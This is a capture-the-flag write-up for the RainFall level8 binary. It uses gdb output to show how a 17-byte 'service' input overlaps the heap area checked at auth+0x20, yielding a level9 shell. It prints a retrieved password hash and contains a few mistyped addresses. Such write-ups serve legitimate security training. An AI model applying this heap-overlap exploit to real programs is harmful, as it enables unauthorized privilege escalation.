1. Basically it is a program which compares string given as inputs (via a loop over fgets) with some static string. It's kind of an authentication process

2. Given the comparisons : if the input starts with "auth ", and the following string is shorter than 30 characters, it copies the portion of the string following "auth " at the memory location pointed to by a global allocated ptr (**auth** in our source.c)

This pointer has an address of **0x8049aac** and a value (i.e. the address to which it points) of **0x804a008** (breakpoint at **0x080485f0 <+140>** right after the first malloc and check what is in eax : `i r $eax` ; the return of the malloc call)

3. If the input starts with "service" : it copies the string following "service" to a newly allocated memory area in the heap, and set the value of a second global pointer (called **serv** in our source.c) to this newly allocated area.

This pointer has an address of **80x8049ab0** and a value of **0x804a018** (breakpoint at **0x080486b0 <+332>** right after the strdup call and check what is in eax : `i r $eax` ; the return of the strdup call))

4. Finally, if the input starts with "login", then it checks if the value stored at **auth + 0x20** or **0x804a008 + 0x20** is not NULL. It is the calue stored at **auth + 0x20**!

5. Finding the flag:

We cannot fill the memory value with 0x20 bytes, as the "auth" string must be less than 30 bytes long. but we can see that the memory address pointed to by the **serv** ptr is 0x10 bytes ahead of the one pointed to by auth, and so filling 16+1 bytes of data at the memory pointed to by the second pointer (**serv**) would suffice to make the memory location at **0x804a008 + 0x20** not NULL and enter the system command!

Looking at 20 words starting at **0x804a008**, we see that we must fille the memory at **0x084a28**:

```
(gdb) x/20wx 0x804a008
0x804a008:	0x63756f63	0x000a756f	0x00000000	0x00000031
0x804a018:	0x41414120	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x0a616141	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb)
```

So our "service" string must be at least 17 bytes long:

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth test
0x804a008, (nil)
serviceAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login hello
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$
```